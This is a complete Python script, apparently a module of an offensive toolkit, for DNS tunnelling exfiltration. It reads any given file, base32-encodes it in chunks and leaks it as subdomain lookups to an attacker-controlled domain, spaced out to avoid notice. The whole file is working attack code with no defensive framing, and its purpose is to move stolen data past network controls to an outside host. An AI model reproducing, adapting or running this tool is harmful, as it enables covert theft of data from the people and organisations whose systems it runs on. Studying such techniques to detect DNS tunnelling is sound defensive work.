#!/usr/bin/env python3
"""
exfil/dns_exfil.py — DNS tunnelling exfiltration helper.

Encodes data as base32 DNS queries to a controlled domain.
Requires a DNS server under your control that logs all queries.

Usage:
  vex exfil dns_exfil -f <file> -d <exfil_domain> [-c <chunk_size>]
"""

import argparse
import base64
import socket
import sys
import time


def parse_args():
    p = argparse.ArgumentParser(description="DNS exfiltration via base32-encoded queries")
    p.add_argument("-f", "--file",       required=True, help="File to exfiltrate")
    p.add_argument("-d", "--domain",     required=True, help="Attacker-controlled domain for DNS queries")
    p.add_argument("-c", "--chunk-size", type=int, default=30,
                   help="Bytes per DNS label (default: 30, max ~63 after encoding)")
    p.add_argument("--delay",            type=float, default=0.5,
                   help="Seconds between queries (default: 0.5)")
    return p.parse_args()


def exfil_file(path: str, domain: str, chunk_size: int, delay: float):
    with open(path, "rb") as fh:
        data = fh.read()

    chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]
    total = len(chunks)
    print(f"[*] Exfiltrating {len(data)} bytes in {total} DNS queries → *.{domain}")

    for idx, chunk in enumerate(chunks):
        label = base64.b32encode(chunk).decode().rstrip("=").lower()
        fqdn = f"{idx}.{label}.{domain}"
        try:
            socket.getaddrinfo(fqdn, None)
        except socket.gaierror:
            pass  # Expected — DNS server just needs to log the query
        print(f"[>] Sent chunk {idx + 1}/{total}: {fqdn[:60]}…")
        time.sleep(delay)

    print("[+] Exfiltration complete.")


def main():
    args = parse_args()
    exfil_file(args.file, args.domain, args.chunk_size, args.delay)


if __name__ == "__main__":
    main()
